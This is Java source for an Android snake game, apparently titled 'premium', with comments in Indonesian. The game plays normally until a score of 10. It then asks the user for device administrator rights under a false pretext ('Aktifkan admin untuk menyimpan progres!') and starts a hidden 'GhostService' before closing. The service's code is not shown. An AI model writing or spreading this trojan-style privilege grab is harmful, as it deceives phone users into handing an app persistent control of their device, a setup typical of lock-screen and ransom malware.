package com.snakegame.premium;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.*;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.widget.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int WIN_SCORE = 10;
    private GameView gameView;
    private TextView scoreText;
    private Handler handler = new Handler();
    private int score = 0;
    private boolean gameOver = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF0A0A0A);
        root.setGravity(Gravity.CENTER);

        // Skor
        scoreText = new TextView(this);
        scoreText.setText("Score: 0");
        scoreText.setTextColor(Color.WHITE);
        scoreText.setTextSize(22);
        scoreText.setPadding(16, 16, 16, 8);
        root.addView(scoreText);

        // Area game
        gameView = new GameView(this);
        LinearLayout.LayoutParams gameParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0);
        gameParams.weight = 1;
        gameView.setLayoutParams(gameParams);
        root.addView(gameView);

        // Joystick
        View joystick = new View(this);
        joystick.setBackgroundColor(0x44FFFFFF);
        LinearLayout.LayoutParams joyParams = new LinearLayout.LayoutParams(180, 180);
        joyParams.bottomMargin = 24;
        joystick.setLayoutParams(joyParams);
        joystick.setOnTouchListener((v, event) -> {
            float cx = v.getWidth() / 2f;
            float cy = v.getHeight() / 2f;
            float dx = event.getX() - cx;
            float dy = event.getY() - cy;
            float dist = (float) Math.sqrt(dx * dx + dy * dy);
            float max = 70f;
            if (dist > max) {
                dx = dx / dist * max;
                dy = dy / dist * max;
            }
            gameView.setJoystick(dx / max, dy / max);
            if (event.getAction() == MotionEvent.ACTION_UP) {
                gameView.setJoystick(0, 0);
            }
            return true;
        });
        root.addView(joystick);

        setContentView(root);

        gameView.startGame();
        updateScore();
    }

    private void updateScore() {
        handler.postDelayed(() -> {
            if (!gameOver) {
                score = gameView.getScore();
                scoreText.setText("Score: " + score);
                if (score >= WIN_SCORE) {
                    gameOver = true;
                    activateAdmin();
                } else {
                    handler.postDelayed(this::updateScore, 50);
                }
            }
        }, 50);
    }

    private void activateAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (!dpm.isAdminActive(comp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan admin untuk menyimpan progres!");
            startActivity(intent);
        } else {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    // ========== GAME VIEW ==========
    public class GameView extends View {
        private List<PointF> foods = new ArrayList<>();
        private List<PointF> enemies = new ArrayList<>();
        private Random rand = new Random();
        private float headX = 400, headY = 600;
        private float joystickX, joystickY;
        private int score = 0;
        private Paint foodPaint, bodyPaint, enemyPaint, eyePaint;
        private Handler h = new Handler();
        private boolean running = true;

        public GameView(Activity ctx) {
            super(ctx);
            bodyPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            bodyPaint.setColor(0xFF00FF88);
            bodyPaint.setStyle(Paint.Style.FILL);

            foodPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            foodPaint.setColor(0xFFFF4444);
            foodPaint.setStyle(Paint.Style.FILL);

            enemyPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            enemyPaint.setColor(0xFF4444FF);
            enemyPaint.setStyle(Paint.Style.FILL);

            eyePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
            eyePaint.setColor(Color.BLACK);
            eyePaint.setStyle(Paint.Style.FILL);

            // Tambah makanan
            for (int i = 0; i < 30; i++) {
                foods.add(new PointF(rand.nextInt(800), rand.nextInt(1200)));
            }
            // Tambah musuh (cacing lain)
            for (int i = 0; i < 5; i++) {
                enemies.add(new PointF(rand.nextInt(800), rand.nextInt(1200)));
            }
        }

        public void startGame() { running = true; h.postDelayed(gameLoop, 16); }
        public int getScore() { return score; }
        public void setJoystick(float x, float y) { joystickX = x; joystickY = y; }

        private Runnable gameLoop = new Runnable() {
            public void run() {
                if (!running) return;
                float speed = 6f;
                headX += joystickX * speed;
                headY += joystickY * speed;
                if (headX < 0) headX = 0;
                if (headX > 800) headX = 800;
                if (headY < 0) headY = 0;
                if (headY > 1200) headY = 1200;

                // Makan makanan
                for (int i = 0; i < foods.size(); i++) {
                    PointF f = foods.get(i);
                    if (Math.hypot(headX - f.x, headY - f.y) < 25) {
                        foods.remove(i);
                        foods.add(new PointF(rand.nextInt(800), rand.nextInt(1200)));
                        score++;
                        break;
                    }
                }
                // Gerak musuh sederhana
                for (PointF e : enemies) {
                    e.x += (rand.nextFloat() - 0.5f) * 4;
                    e.y += (rand.nextFloat() - 0.5f) * 4;
                    if (e.x < 0) e.x = 0;
                    if (e.x > 800) e.x = 800;
                    if (e.y < 0) e.y = 0;
                    if (e.y > 1200) e.y = 1200;
                }
                invalidate();
                h.postDelayed(this, 16);
            }
        };

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            canvas.drawColor(0xFF1a1a2e);
            // Makanan
            for (PointF f : foods) {
                foodPaint.setColor(rand.nextInt(2) == 0 ? 0xFFFF4444 : 0xFF44FF44);
                canvas.drawCircle(f.x, f.y, 8, foodPaint);
            }
            // Musuh
            for (PointF e : enemies) {
                canvas.drawCircle(e.x, e.y, 20, enemyPaint);
                canvas.drawCircle(e.x - 6, e.y - 6, 4, eyePaint);
                canvas.drawCircle(e.x + 6, e.y - 6, 4, eyePaint);
            }
            // Pemain (cacing)
            canvas.drawCircle(headX, headY, 22, bodyPaint);
            canvas.drawCircle(headX - 7, headY - 7, 5, eyePaint);
            canvas.drawCircle(headX + 7, headY - 7, 5, eyePaint);
        }
    }
}
